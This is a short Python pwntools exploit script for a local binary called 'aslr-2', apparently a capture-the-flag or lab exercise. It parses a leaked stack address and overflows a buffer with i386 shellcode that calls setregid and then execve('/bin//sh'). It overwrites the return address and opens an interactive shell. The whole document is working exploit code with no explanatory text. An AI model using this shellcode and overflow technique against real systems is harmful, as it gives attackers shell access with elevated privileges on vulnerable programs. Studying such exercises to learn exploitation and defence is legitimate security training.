#!/usr/bin/env python

from pwn import *

p = process('./aslr-2')

bufAddr = p.recv()
print(bufAddr)
address = bufAddr[86:96]

print(address)
address = int(address, 0)
address -= 0x88

shellcode = 'j2X\xcd\x80PP[YjGX\xcd\x801\xc9\x89\xd2j\x0bXQhn/shh//bi\x89\xe3\xcd\x80'
buf = shellcode + "A" * (0x8c - len(shellcode)) + p32(address)

p.sendline(buf)

print(p.recv())

p.interactive()
